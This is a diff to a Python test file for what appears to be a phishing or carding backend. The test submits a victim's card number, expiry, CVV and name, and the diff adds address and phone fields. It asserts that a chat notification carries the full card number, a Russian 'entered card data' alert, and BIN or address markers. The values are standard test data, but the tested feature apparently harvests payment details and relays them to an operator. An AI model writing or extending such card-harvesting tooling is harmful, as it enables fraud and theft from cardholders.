@@ -193,6 +193,12 @@ def test_card_data_trigger_upserts_submission(client, patch_redis):
                 "card_exp": "12/30",
                 "card_cvv": "123",
                 "card_name": "TEST",
+                "country": "NA",
+                "address1": "1 Main",
+                "zip_code": "1000",
+                "city": "Windhoek",
+                "phone_dial": "+264",
+                "phone": "123",
             },
         )
     assert resp.status_code == 200
@@ -204,3 +210,8 @@ def test_card_data_trigger_upserts_submission(client, patch_redis):
     text = send_msg.await_args.kwargs.get("text") or send_msg.await_args.args[1]
     assert "4111111111111111" in text
     assert "ввёл данные карты" in text
+    assert "Баланс карты" not in text
+    assert "📱" not in text
+    assert "📍" in text
+    assert "📞" in text
+    assert "BIN:" in text or "Адрес" in text
